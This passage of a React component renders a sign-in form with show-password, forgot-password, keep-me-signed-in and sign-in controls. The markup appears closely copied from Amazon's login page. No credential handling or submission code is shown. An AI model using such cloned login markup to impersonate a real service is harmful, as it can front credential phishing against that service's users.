                                                    id="ap_show_password_checked"
                                                />

                                                <input
                                                    type="hidden"
                                                    name="encryptedPasswordExpected"
                                                />
                                            </div>

                                            <div className={styles2['a-row'] + " flex justify-between"}>
                                                <div className={`${styles2['a-column']} ${styles2['a-span6']} ${styles2['a-spacing-medium']}`}>
                                                    <div
                                                        data-a-input-name="rememberMe"
                                                        className={`${styles2['a-checkbox']} ${styles2['a-checkbox-fancy']} ${styles2['a-control-row']} ${styles2['a-touch-checkbox']}`}
                                                    >
                                                        <label>
                                                            <input
                                                                type="checkbox"
                                                                name="rememberMe"
                                                                value="true"
                                                                tabIndex="4"
                                                                checked={showPassword}
                                                                onChange={(e) => handleCheckboxChange(e)}
                                                            />
                                                            <i className={`${styles2['a-icon']} ${styles2['a-icon-checkbox']}`}></i>
                                                            <span className={`${styles2['a-label']} ${styles2['a-checkbox-label']}`}>Show password</span>
                                                        </label>
                                                    </div>
                                                </div>

                                                <div className={`${styles2['a-column']} ${styles2['a-span6']} ${styles2['a-text-right']} ${styles2['a-spacing-none']} ${styles2['a-spacing-top-small']} ${styles2['a-span-last']}`}>
                                                    <a
                                                        id="auth-fpp-link-bottom"
                                                        className={`${styles2['a-spacing-none']} ${styles2['a-link-normal']}`}
                                                        tabIndex="8"
                                                        href="/"
                                                    >
                                                        Forgot password?
                                                    </a>
                                                </div>
                                            </div>

                                            <div className={styles2['a-row'] + ' ' + styles2['a-spacing-base']}>
                                                <div
                                                    data-a-input-name="rememberMe"
                                                    className={`${styles2['a-checkbox']} ${styles2['a-checkbox-fancy']} ${styles2['a-control-row']} ${styles2['a-touch-checkbox']}`}
                                                >
                                                    <label>
                                                        <input
                                                            type="checkbox"
                                                            name="rememberMe"
                                                            value="true"
                                                            tabIndex="4"
                                                        />
                                                        <i className={`${styles2['a-icon']} ${styles2['a-icon-checkbox']}`}></i>
                                                        <span className={`${styles2['a-label']} ${styles2['a-checkbox-label']}`}>
                                                            Keep me signed in.
                                                            <span
                                                                className="a-declarative"
                                                                data-action="a-modal"
                                                                data-csa-c-type="widget"
                                                                data-csa-c-func-deps="aui-da-a-modal"
                                                                data-a-modal='{"max-width":"500px","closeButtonLabel":"","width":"95%","name":"remember-me-detail-link-modal","header":"\"Keep Me Signed In\" Checkbox"}'
                                                                data-csa-c-id="w3f900-sz1idw-iuta5s-19zlge"
                                                            >
                                                                <a
                                                                    id="remember_me_learn_more_link"
                                                                    className={styles2['a-link-normal']}
                                                                    href="/"
                                                                >
                                                                    {' '}
                                                                    Details
                                                                </a>
                                                            </span>
                                                            <div
                                                                className={styles2['a-popover-preload']}
                                                                id="a-popover-remember-me-detail-link-modal"
                                                            >
                                                                <div className={`${styles2['a-section']} ${styles2['a-spacing-large']} ${styles2['a-spacing-top-mini']}`}>
                                                                    <p></p>
                                                                    <p>Choosing "Keep me signed in" reduces the number of times you're asked to Sign-In on this device.</p>
                                                                    <p>To keep your account secure, use this option only on your personal devices.</p>
                                                                    <p></p>
                                                                </div>
                                                            </div>
                                                        </span>
                                                    </label>
                                                </div>
                                            </div>

                                            <div className={styles2['a-row']}></div>

                                            <span
                                                id=""
                                                onClick={(e) => onNextStep(e)}
                                                className={`${styles2['a-button']} ${styles2['a-button-span12']} ${styles2['a-button-primary']} ${styles2['auth-disable-button-on-submit']}`}
                                            >
                                                <span className={styles2['a-button-inner']}>
                                                    <span
                                                        id="auth-signin-button-announce"
                                                        className={styles2['a-button-text']}
                                                        aria-hidden="true"
                                                    >
                                                        Sign in
                                                    </span>
                                                </span>
                                            </span>
                                        </form>
                                    </div>
                                </div>
                            </>
                    }
                    <Footer />
                </div >
            </div >

        </main >
    );
}
